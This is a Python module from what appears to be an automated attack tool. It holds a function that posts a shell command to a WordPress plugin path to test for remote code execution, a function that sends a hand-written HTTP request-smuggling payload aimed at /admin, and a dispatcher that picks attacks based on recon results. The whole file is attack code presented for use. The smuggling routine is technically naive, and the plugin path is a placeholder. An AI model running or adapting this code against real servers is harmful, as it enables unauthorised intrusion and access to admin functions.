# modules/http.py
import requests

def try_wordpress_rce(ip, port):
    print(f"[📦] Attempting WordPress RCE on {ip}:{port}...")
    try:
        url = f"http://{ip}:{port}/wp-content/plugins/vulnerable-plugin/exploit.php"
        payload = {"cmd": "id"}
        r = requests.post(url, data=payload, timeout=3)
        if "uid=" in r.text:
            print(f"[✅] Exploit succeeded! Response: {r.text.strip()}")
        else:
            print("[❌] Exploit failed or not vulnerable.")
    except Exception as e:
        print(f"[!] WordPress RCE error: {e}")

def try_http_smuggling(ip, port):
    print(f"[📦] Attempting HTTP request smuggling on {ip}:{port}...")
    try:
        smuggle_payload = (
            "POST / HTTP/1.1\r\n"
            "Host: target\r\n"
            "Transfer-Encoding: chunked\r\n"
            "Content-Length: 4\r\n"
            "\r\n"
            "0\r\n\r\n"
            "GET /admin HTTP/1.1\r\n"
            "Host: target\r\n\r\n"
        )
        r = requests.post(f"http://{ip}:{port}/", data=smuggle_payload, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=3)
        if r.status_code == 200:
            print("[⚠️] Smuggling response received – review manually.")
        else:
            print("[❌] Smuggling failed or filtered.")
    except Exception as e:
        print(f"[!] Smuggling error: {e}")

def run(ip, port, intel):
    if intel['CMS'] == 'Wordpress':
        try_wordpress_rce(ip, port)
    if intel['WAF'] != 'None':
        try_http_smuggling(ip, port)
    # Future: Add fallback to log poisoning, XSS probes, etc.
